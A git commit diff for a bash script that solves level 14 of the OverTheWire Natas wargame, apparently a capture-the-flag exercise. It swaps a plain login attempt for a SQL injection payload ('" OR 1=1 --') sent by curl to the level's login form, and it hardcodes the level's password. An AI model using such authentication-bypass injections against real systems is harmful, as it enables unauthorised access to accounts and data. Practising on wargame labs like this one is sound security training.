5b3af1a3429974bb08b63937a8409888042d3361
Clouz <clouz85@gmail.com>
2017-11-01 23:25:05 +0100

    natas 14 prova

--- Natas/natas14.bash
+++ Natas/natas14.bash
@@ -1,4 +1,7 @@
 usr="natas14"
 psw="Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"
 
-curl --user "$usr:$psw" -X POST --form "username=1000" --form "password=xx" -H "debug"  http://$usr.natas.labs.overthewire.org/ 
+user1="\" OR 1=1 --"
+psw1=""
+
+curl --user "$usr:$psw" -X POST --form "username=$user1" --form "password=$psw1" -H "debug:1"  http://$usr.natas.labs.overthewire.org/ 
